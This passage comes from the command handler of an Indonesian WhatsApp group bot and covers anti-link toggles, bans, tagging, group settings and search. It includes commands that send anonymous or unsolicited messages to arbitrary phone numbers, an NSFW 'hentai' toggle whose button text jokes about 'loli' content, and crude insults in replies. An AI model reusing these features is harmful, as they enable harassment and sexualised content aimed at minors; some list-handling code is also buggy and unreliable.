 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
 }
 break

 case 'afk': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 let user = global.db.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = args.join(" ")
 replay(`${m.pushName} Sekarang lagi afk.\nAlasan AFK : ${args.join(" ") ? args.join(" ") : ''}`)
 }
 break


 case 'fliptext': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (args.length < 1) return replay(`Example:\n${prefix}fliptext ${OwnerName}`)
 quere = args.join(" ")
 flipe = quere.split('').reverse().join('')
 replay(`\`\`\`「  Text Flipper Tool  」\`\`\`\n*Input text :*\n${quere}\n*Fliped text :*\n${flipe}`)
 }
 break

 case 'toletter': {
    if (isBan) return reply(mess.banned)	
 if (isBanChat) return reply(mess.bangc)
 if (!Number(args[0])) return replay(`Example:\n${prefix}toletter 956`)
 try {
 quere = args.join(" ")
 convertes = await toHur(quere)
 replay(`\`\`\`「  Word Maker Tool  」\`\`\`\n*Input Number :*\n${quere}\n*Converted Alphabet :*\n${convertes}`)
 } catch {
 replay(`Error!`)
 }
 }
break
   case 'leveling':
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return reply(mess.useradmin)
 if (args.length < 1) return reply('Type on to *Enable*\nType off to *Disable*')
 if (args[0] === 'on'){
 if (isLeveling) return reply(`Already activated`)
 _leveling.push(from)
 fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
 reply('Leveling activated')
 } else if (args[0] === 'off'){
 let anu = _leveling.indexOf(from)
 _leveling.splice(anu, 1)
 fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
 reply('Leveling deactivated')
 } 
 break

 case 'antilinkgc': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLink) return replay('Already activated')
 ntilink.push(from)
 replay('Activated _Antilink_ in this group.')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLink) return replay('Already deactivated!')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
 replay('Deactivated _Antilink_ in this group!')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkgc on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkgc off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break

case 'menfess':
case 'menfes':
case 'confes':
case 'confess': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Didalam Grup!')
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer orang yang mau dikirim/nama samaran anda/pesan yang ingin disampaikan\n\nContoh ${prefix}${command} 6283169696969/ini nama samaran ya/Sebenernya aku suka sama kamu\n\nContoh 2 : ${prefix}${command} 6283169696969/Tebak siapa?/Sebenernya aku suka sama kamu!\n\nTenang aja privasi aman kok><`)
let nomor = q.split('/')[0] ? q.split('/')[0] : q
let saking = q.split('/')[1] ? q.split('/')[1] : q
let pesan = q.split('/')[2] ? q.split('/')[2] : ''
if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai kak ada Menfess nih!!\n─────────────\n*© Miuna | Ri*\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
let btutonmnfs = [{buttonId: `-menfesconfirm ${m.sender}`, buttonText: {displayText: 'Confirm Menfes'}, type: 1},
		 {buttonId: `-menfess`, buttonText: {displayText: 'Kirim Menfess'}, type: 1}
		 ]
let buntnmenfes = {
image: { url: `https://telegra.ph/file/238a9ba81c0787c3e3522.jpg`},
caption: teksnya,
footer: `Miuna`,
buttons: btutonmnfs,
headerType: 4
}
XeonBotInc.sendMessage(`${nomor}@s.whatsapp.net`, buntnmenfes, { quoted: fvn })
m.reply(`Sukses Mengirim Menfess!!`) }
break
case 'menfesconfirm': {
XeonBotInc.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess Nya Sama Si Dia🤭`})
m.reply(`Terimakasih Menfess Telah Diterima.\n\nMau kirim menfess juga? klik tombol diatas!`) }
break
		
case 'x' :
if (!isCreator) return reply (mess.mod)
if (!args.join(" ")) return reply(`Textnya tot!`) 
XeonBotInc.sendMessage(`120363027488032044@g.us`, { text : args.join(" ") ? args.join(" ") : ''},{ quoted: fdocs })
break
case 'k' : {
if (!isCreator) return reply (mess.mod)
if (!text) return reply (`textnya?`)
let nomor = q.split('/')[0] ? q.split('/')[0] : q
let pesan = q.split('/')[1] ? q.split('/')[1] : q
XeonBotInc.sendMessage(`${nomor}@s.whatsapp.net`, {text : `${pesan}`}, { quoted: fvn })
m.reply(`Wess`) 
}
break

case 'g' : {
if (!isCreator) return reply (mess.mod)
if (!text) return reply (`textnya?`)
let nomor = q.split('/')[0] ? q.split('/')[0] : q
let pesan = q.split('/')[1] ? q.split('/')[1] : q
XeonBotInc.sendMessage(`${nomor}@g.us`, {text : `${pesan}`}, { quoted: fvn })
m.reply(`Wess`) 
}
break


   case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkYoutubeVid) return replay('Already activated')
 ntilinkytvid.push(from)
 replay('Activated youtube video antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkYoutubeVid) return replay('Already deactivated')
 let off = ntilinkytvid.indexOf(from)
 ntilinkytvid.splice(off, 1)
 replay('Deactivated youtube video antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkyoutubevideo on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkyoutubevideo off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break



     case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkYoutubeChannel) return replay('Already activated')
 ntilinkytch.push(from)
 replay('Activated youtube channel antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkYoutubeChannel) return replay('Already deactivated')
 let off = ntilinkytch.indexOf(from)
 ntilinkytch.splice(off, 1)
 replay('Deactivated youtube channel antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkyoutubech on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkyoutubech off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkInstagram) return replay('Already activated')
 ntilinkig.push(from)
 replay('Activated instagram antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkInstagram) return replay('Already deactivated')
 let off = ntilinkig.indexOf(from)
 ntilinkig.splice(off, 1)
 replay('Deactivated instagram antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkinstagram on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkinstagram off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
   }
   }
   break

   case 'antilinkfacebook': case 'antilinkfb': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkFacebook) return replay('Already activated')
 ntilinkfb.push(from)
 replay('Activated facebook antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkFacebook) return replay('Already deactivated')
 let off = ntilinkfb.indexOf(from)
 ntilinkfb.splice(off, 1)
 replay('Deactivated facebook antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkfacebook on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkfacebook off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinktelegram': case 'antilinktg': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTelegram) return replay('Already activated')
 ntilinktg.push(from)
 replay('Activated telegram antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTelegram) return replay('Already deactivated')
 let off = ntilinkig.indexOf(from)
 ntilinkig.splice(off, 1)
 replay('Deactivated telegram antilink in this group')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinktelegram on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinktelegram off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinktiktok': case 'antilinktt': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTiktok) return replay('Already activated')
 ntilinktt.push(from)
 replay('Activated tiktok antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTiktok) return replay('Already deactivated')
 let off = ntilinktt.indexOf(from)
 ntilinktt.splice(off, 1)
 replay('Deactivated tiktok antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinktiktok on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinktiktok off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break

   case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTwitter) return replay('Already activated')
 ntilinktwt.push(from)
 replay('Activated twitter antilink in this group !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTwitter) return replay('Already deactivated')
 let off = ntilinktwt.indexOf(from)
 ntilinktwt.splice(off, 1)
 replay('Deactivated twitter antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinktwt on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinktwt off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break


   case 'antilinkall': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiLinkTwitter) return replay('Already activated')
 ntilinkall.push(from)
 replay('Enabled all antilink !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkAll) return replay('Already deactivated')
 let off = ntilinkall.indexOf(from)
 ntilinkall.splice(off, 1)
 replay('Disabled all antilink !')
 } else {
   let buttonsntilink = [
   { buttonId: `-antilinkall on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antilinkall off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break


   case 'antiwame': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (antiWame) return replay('Already activated')
 ntwame.push(from)
 replay('Activated antiwame !')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`*「  Warning  」*\`\`\`\n\nAntilink is enabled!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!antiWame) return replay('Already deactivated')
 let off = nttoxic.indexOf(from)
 ntwame.splice(off, 1)
 replay('Deactivated antiwame !')
 } else {
   let buttonsntwame = [
   { buttonId: `-antiwame on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `-antiwame off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
   }
   }
   break
 case 'gimana': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!isCreator) return reply(mess.botowner)
 reply(`Gawaras anying!`)
 
 
 }
 break
 
   case 'hentai': case 'hen': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (args[0] === "on") {
 if (AntiNsfw) return replay('ᴜᴅᴀʜ ʜɪᴅᴜᴘ ᴅᴀʀɪ ᴛᴀᴅɪ ᴋᴀᴋ!')
 ntnsfw.push(from)
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 XeonBotInc.sendMessage(from, {text: `\`\`\`「 ᴘᴇʀʜᴀᴛɪᴀɴ! 」\`\`\`\n ᴍᴏᴅᴇ *ʜᴇɴᴛᴀɪ* ᴛᴇʟᴀʜ ᴅɪᴀᴋᴛɪғᴋᴀɴ!\n\nsᴇᴋᴀʀᴀɴɢ sᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ʙɪsᴀ ᴀᴋsᴇs ɢᴀᴍʙᴀʀ ᴋᴀʀᴛᴜɴ ᴛᴇʟᴀɴᴊᴀɴɢ!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiNsfw) return replay('ᴜᴅᴀʜ ᴍᴀᴛɪ ᴅᴀʀɪ ᴛᴀᴅɪ ᴋᴀᴋ!')
 let off = ntnsfw.indexOf(from)
 ntnsfw.splice(off, 1)
 replay('ᴍᴏᴅᴇ *ʜᴇɴᴛᴀɪ* ᴛᴇʟᴀʜ ᴅɪᴍᴀᴛɪᴋᴀɴ!')
 } else {
   let buttonsntnsfw = [
   { buttonId: `-hentai on`, buttonText: { displayText: 'Aktifin' }, type: 1 },
   { buttonId: `-hentai off`, buttonText: { displayText: 'Matiin' }, type: 1 }
   ]
   await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw, `sɪʟᴀʜᴋᴇᴜɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ɪɴɪ\n\nᴋᴇᴛᴀʜᴜᴀɴ ɴʏᴀʀɪ ʙᴏᴋᴇᴘ ʟᴏʟɪ = ғʙɪ ᴅᴀᴛᴀɴɢ ᴋᴇʀᴜᴍᴀʜ`, `${global.BotName}`, m)
   }
   }
		
   break


   case 'ban': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!isCreator) return replay(mess.botowner)
if (!args[0]) return replay(`Pilih banned or Unbanned (add untuk banned, del untuk unbanned), Contoh: Balas pesan orang yg mau dibanned dengan *${prefix}ban add* .`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banUser.includes(orgnye)
if (args[0] === "add") {
if (isBane) return ads('User is already banned.')
banUser.push(orgnye)
replay(`Orang itu telah dibanned, mampos!!!.`)
} else if (args[0] === "del") {
if (!isBane) return ads('User is already unbanned.')
let delbans = banUser.indexOf(orgnye)
banUser.splice(delbans, 1)
replay(`Orang itu sudah di unbanned , jangan tengil lagi yah!.`)
} else {
replay("Error")
}
}
break


case 'listonline': case 'listaktif': case 'here':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
 let online = [...Object.keys(store.presences[id]), botNumber]
 let liston = 1
 XeonBotInc.sendText(m.chat, '  「 *Member yang lagi aktif* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break

case 'happymod': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return replay(`Example : ${prefix + command} Kinemaster`)
 yogipw.happymod(args.join(" ")).then(async(res) => {
 teks = '```「 HappyMod Search Engine 」```'
 for (let i of res) {
 teks += `\n\n${i.name}\n`
 teks += `${i.link}`
 }
 let buttons = [
 {buttonId: `-menu`, buttonText: {displayText: '✨Menu✨'}, type: 1}
 ]
 let buttonMessage = {
 image: {url:res[0].icon},
 jpegThumbnail: Thumb,
 caption: teks,
 footer: `${global.BotName}`,
 buttons: buttons,
 headerType: 4
 }
 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
 })
 }
 break

 case 'yts': case 'ytsearch': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!args.join(" ")) return replay(`Ketik Judul tot. Contoh : -yts Asede Kontol`)
 let yts = require("yt-search")
 let search = await yts(args.join(" "))
 let teks = '```「 YouTube search Engine 」```\n\n Kata Kunci: '+text+'\n\n'
 let no = 1
 for (let i of search.all) {
 teks += `Hasil Nomer : ${no++}\n\nTitle : ${i.title}\n\nPenonton : ${i.views}\n\nDurasi : ${i.timestamp}\n\nDiupload : ${i.ago}\n\nAuthor : ${i.author.name}\n\nUrl : ${i.url}\n\n\n-----------------------------------------------------------------------------\n\n\n`
 }
 XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
 }
 break

 case 'setname': case 'setsubject': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!text) return replay('Pls enter -setname <New Group Name>  to change this Group Name')
 await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
 }
 break

case 'block': {
    if (!isCreator) return reply(mess.botowner)
    if (isBan) return reply(mess.banned)		
    if (isBanChat) return reply(mess.bangc)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.updateBlockStatus(users, 'block').then((res) => m.reply(`Wakatta Ni-sama`)).catch((err) => reply(jsonformat(err)))
 }
 break

case 'unblock': {
 if (!isCreator) return reply(mess.botowner)
    if (isBan) return reply(mess.banned)	 	
    if (isBanChat) return reply(mess.bangc)
    
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await XeonBotInc.updateBlockStatus(users, 'unblock').then((res) => reply(`Wakatta oniichan!`)).catch((err) => reply(jsonformat(err)))
 }
 break

 case 'setdesc': case 'setdesk': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!text) return replay('Pls enter -setname <New Group Description>  to change this Group Description.')
 await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replay(mess.jobdone)).catch((err) => replay(jsonformat(err)))
 }
 break

 case 'setgrouppp': case 'setgruppp': case 'setgcpp': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 if (!quoted) return replay(`Send/Reply Image With Caption ${prefix + command}`)
 if (!/image/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
 if (/webp/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 await XeonBotInc.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
 replay(mess.jobdone)
 }
 break

 
 case 'tag': case 'tagall': case 'all':{
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 let teks = `「 _Tag All_ 」
  
 *Message : ${args.join(" ") ? args.join(" ") : 'no message'}*\n\n`
 for (let mem of participants) {
 teks += `» @${mem.id.split('@')[0]}\n`
 }
 XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
 }
 break



 case 'hidetag': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isAdmins && !isCreator) return replay(mess.useradmin)
 XeonBotInc.sendMessage(m.chat, { text : args.join(" ") ? args.join(" ") : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 }
 break

 case 'grouplink': case 'gclink': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 if (!m.isGroup) return replay(mess.grouponly)
 if (!isBotAdmins) return replay(mess.botadmin)
 let response = await XeonBotInc.groupInviteCode(m.chat)
 XeonBotInc.sendMessage(m.chat, {text:`*Nama Grup:* *${groupMetadata.subject}* \n\n*Link Grup :* \nhttps://chat.whatsapp.com/${response}l`, "contextInfo": {
 mimetype: "image/jpeg",
 text: `${global.OwnerName}`,
 "forwardingScore": 1000000000,
 isForwarded: true,
 sendEphemeral: true,
 "externalAdReply": {
 "title": `${global.BotName}`,
 "body": `${global.WaterMark}`,
 "previewType": "PHOTO",
 "thumbnailUrl": Thumb,
 "thumbnail": Thumb,
 "sourceUrl": `${global.websitex}`
 }}}, { quoted: m, detectLink: true })
 }
 break


 case 'resetlinkgc':
    case 'resetlinkgroup':
    case 'resetlinkgrup':
    case 'clink':
    case 'resetlink':
    case 'resetgrouplink':
    case 'resetgclink':
    case 'resetgruplink': {
       if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    if (!m.isGroup) return replay(mess.grouponly)
    if (!isBotAdmins) return replay(mess.botadmin)
    if (!isAdmins && !isCreator) return replay(mess.useradmin)
    XeonBotInc.groupRevokeInvite(m.chat)
    }
    break


    case 'group': case 'grup': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     if (args[0] === 'close'){
     await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replay(`Group has been closed!`)).catch((err) => replay(jsonformat(err)))
     } else if (args[0] === 'open'){
     await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replay(`Group has been opened!`)).catch((err) => replay(jsonformat(err)))
     } else {
     let buttons = [
     { buttonId: '-group open', buttonText: { displayText: 'Buka' }, type: 1 },
     { buttonId: '-group close', buttonText: { displayText: 'Tutup' }, type: 1 }
     ]
     let buttonMessage = {
     image: BotLogo,
     jpegThumbnail: Thumb,
     caption: `*「 ${global.BotName} 」*\n\n_Group Setting Changer tool_:`,
     footer: `${BotName}`,
     buttons: buttons,
     headerType: 4
     }
     XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
     }
     }
     break

     case 'naikin': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
     if (!isAdmins && !isCreator) return replay(mess.useradmin)
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replay(jsonformat(res))).catch((err) => replay(jsonformat(err)))
     }
     break

     case 'turunin': {
        if (isBan) return reply(mess.banned)	 			
     if (isBanChat) return reply(mess.bangc)
     if (!m.isGroup) return replay(mess.grouponly)
     if (!isBotAdmins) return replay(mess.botadmin)
